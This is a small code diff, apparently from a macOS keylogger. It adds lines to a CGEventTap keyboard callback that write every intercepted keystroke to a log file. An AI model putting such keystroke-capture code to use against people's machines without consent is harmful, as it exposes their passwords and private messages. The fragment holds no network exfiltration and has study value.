@@ -41,6 +41,9 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
         return event;
     }
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+    
+    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    fflush(logfile);
 
     return event;
 }
